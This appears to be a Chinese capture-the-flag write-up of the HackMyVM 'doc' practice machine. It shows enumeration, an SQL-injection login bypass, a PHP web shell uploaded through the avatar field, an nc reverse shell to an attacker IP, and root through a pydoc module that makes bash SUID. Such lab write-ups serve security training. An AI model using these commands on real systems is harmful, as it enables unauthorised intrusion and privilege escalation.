<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fYQdN5ue_RDIERqevV-PdA)

  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

**OSCP 靶场  
**

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

靶场介绍
----

<table width="630"><tbody><tr><td width="120"><p>doc</p></td><td width="64"><p>easy</p></td><td width="446"><p>cms getshell、sql 注入、任意文件上传、凭证收集、端口转发、socat 使用、python 模块利用提权</p></td></tr></tbody></table>

信息收集
----

### 主机发现

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2DCIUgSPcUsNzR9tL9yFupNtY5n7RBYUW4lNIiague4NsOD2bxxbsneg/640?wx_fmt=png&from=appmsg)

### 端口扫描

```
┌──(root㉿kali)-[~]
└─# nmap -sV -A -p- -T4 192.168.31.215
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-13 05:15 EST
Nmap scan report for doc (192.168.31.215)
Host is up (0.00074s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-title: Online Traffic Offense Management System - PHP
MAC Address: 08:00:27:73:E3:AB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms doc (192.168.31.215)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds

```

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2oRl3ChVNzOwhDFiboBy8XYPMNn7EVCVibs8XcdTGPTs4Buf8TOhIwzCw/640?wx_fmt=png&from=appmsg)

### 目录扫描

```
                                                                                                                   
┌──(root㉿kali)-[~]
└─# gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.31.215 -x php,txt,html -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.31.215
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://192.168.31.215/index.php            (Status: 200) [Size: 14323]
http://192.168.31.215/about.html           (Status: 200) [Size: 1491]
http://192.168.31.215/home.php             (Status: 500) [Size: 229]
http://192.168.31.215/uploads              (Status: 301) [Size: 169] [--> http://192.168.31.215/uploads/]
http://192.168.31.215/pages                (Status: 301) [Size: 169] [--> http://192.168.31.215/pages/]
http://192.168.31.215/admin                (Status: 301) [Size: 169] [--> http://192.168.31.215/admin/]
http://192.168.31.215/assets               (Status: 301) [Size: 169] [--> http://192.168.31.215/assets/]
http://192.168.31.215/plugins              (Status: 301) [Size: 169] [--> http://192.168.31.215/plugins/]
http://192.168.31.215/database             (Status: 301) [Size: 169] [--> http://192.168.31.215/database/]
http://192.168.31.215/classes              (Status: 301) [Size: 169] [--> http://192.168.31.215/classes/]
http://192.168.31.215/config.php           (Status: 200) [Size: 0]
http://192.168.31.215/dist                 (Status: 301) [Size: 169] [--> http://192.168.31.215/dist/]
http://192.168.31.215/404.html             (Status: 200) [Size: 198]
http://192.168.31.215/inc                  (Status: 301) [Size: 169] [--> http://192.168.31.215/inc/]
http://192.168.31.215/build                (Status: 301) [Size: 169] [--> http://192.168.31.215/build/]
http://192.168.31.215/libs                 (Status: 301) [Size: 169] [--> http://192.168.31.215/libs/]


```

添加域名

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2YkhBc6HAYjwSuayKaugwl9a751jaMEs6sPyIVboNbeVbnfWy8Dgv4Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2TPNhbH79nuEgQnibpyrrdIua9Ttzia2834KYLAkgdicN7ib45icrJOQ3r7A/640?wx_fmt=png&from=appmsg)

权限获取
----

通过万能密码进入系统后台

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2ibGp4AebdbdddMo9FIhtbZze9cl9xCPiaeRVcgHRKDKdDpVVapL0gfEg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2XaM4UEjkYmNvibFMU36k6kZ7Gt04CXSY3keibP4skeHpoWpiaBrNK6D4A/640?wx_fmt=png&from=appmsg)

头像处存在任意文件上传漏洞，尝试上传 phpinfo 文件，成功解析

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2a69Wibmhhe0gibPgMekiaTJpTlyum3lnRgB0EmRibD3oLccB6hTNyyRnIA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l22dFGhCdqRnePj6KLzoRYNNLq0aUzdAguUq4yySO37gsGyfL3ibjycFA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2oJKzvTnIUS8Wsa48iayicksu5B2nGQXibVPXtETliaLGIx7vsLOvicSVEaQ/640?wx_fmt=png&from=appmsg)

```
http://doc.hmv/uploads/drivers/1.php?cmd=nc%20192.168.31.11%208888%20-e%20/bin/bash

```

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2hmZ1RkAeYdWufOXRGibLyOsJrAMicDo5RPE710um8qHTLSewaCibFXBrw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2EnmTXazGEDFabAjTJEr4B15beH1xozfvdfDNyNlkrI6n9VLteicribpA/640?wx_fmt=png&from=appmsg)

通过收集的凭据登录到 bella 用户

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2ERkI5ax12VeGGRIU8icK9F0ibfv6n1GuWUuWlUiaUWJZw40k2K34Mn3BQ/640?wx_fmt=png&from=appmsg)

权限提升
----

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2dDHD2pbIibN3L4pEQXC3dAsZcQIPDdu9kM32WLzsagyaT5DcAibUvIhQ/640?wx_fmt=png&from=appmsg)

执行 doc 程序会开启一个 web 服务

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2pNKVlPialYX4gZKBaxSYa5yGCPB22bgE7pTWSoVyQ9BT8CNN8ianRDiaA/640?wx_fmt=png&from=appmsg)

通过 strings 查看字符串，可以看到执行了 pydoc3.9 -p 7890

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2X8VsJibg1J4d1FecjBldOm4jMQicbwnjxDd6XZLzY4VKax9WCJicZcMibw/640?wx_fmt=png&from=appmsg)

查看 pydoc3.9 模块，就执行了 cli() 方法。我们尝试篡改里面的内容，但是发现没有权限。

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2XjlkGXH142icW7qicmPcv1O4r6icJNd13eSP6c8dapadtso2PakQ9eCicg/640?wx_fmt=png&from=appmsg)

利用 socat 进行端口转发，我们可以看到开启后的服务，展示 python 的一些模块

```
nohup socat tcp-listen:5000,fork tcp:127.0.0.1:7890 &
sudo doc

```

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2angjicC1ZU1sfGZqkwRZmyp8oX9XRIRIsfDicvFibFCUtqKQL7mNdAfWQ/640?wx_fmt=png&from=appmsg)

在 home/bella 下创建一个 py 文件，可以看到会出现在 web 服务上。

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2QSPYHpkOTfX7S4n0l1yYAqyUod7JVSpbvbgDBHgmeWgIxbuLlNXrZw/640?wx_fmt=png&from=appmsg)

接下来，我们在刚创建的文件下写入如下代码，然后再 web 访问一下，将会执行命令，给 bash 加上特殊权限。

```
import os 
os.system("chmod +s /bin/bash");

```

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2zv26B6dGfVs1jtZS6SBQaxEmLUzq1Fdx1VhtuJeE1yZHdXdQdSSY7Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2FVVdib3OFpS6WjvMXvxJM5UOwvzvC6yNBQZ7fSicYicGqKN6Ntnpt4XTg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCAtMMzicfrlWKd6MCGjO69l2S6qibgBwJulzJH5gIoO06YcFibKatp1RqZhRdw9eiaibK71SmHl4j33J5g/640?wx_fmt=png&from=appmsg)

End

“点赞、在看与分享都是莫大的支持”  

![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCDACJgvibBSia6MChia78vgBGURXW2Sq5o3uZTdw9oeR6yn90jH0BZrS0pl9ibYXicoDSXU8YkRQ49FjCA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/pM2klgicgT5dylTzXyrXBmex6dlAsZ0QJOQdzqcw2HpC49rnL0dTHNsWsOze4QmRYN7fPRoLdVK5MXs0DXtOvZw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)